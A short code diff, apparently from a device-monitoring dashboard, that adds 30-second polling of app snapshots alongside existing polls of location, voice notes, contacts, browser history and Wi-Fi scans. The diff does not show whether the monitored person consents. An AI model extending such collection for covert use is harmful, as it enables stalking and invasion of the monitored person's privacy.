@@ -838,6 +838,7 @@ function startPolling() {
   pollLocation();
   schedulePoll('meta', intervals.meta, pollMeta);
   schedulePoll('apps', intervals.apps, pollApps);
+  schedulePoll('appSnapshots', 30000, pollAppSnapshots);
   schedulePoll('hist', intervals.hist, pollHistory);
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
   schedulePoll('contacts', intervals.contacts, pollContacts);
@@ -858,7 +859,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollApps(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans()];
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
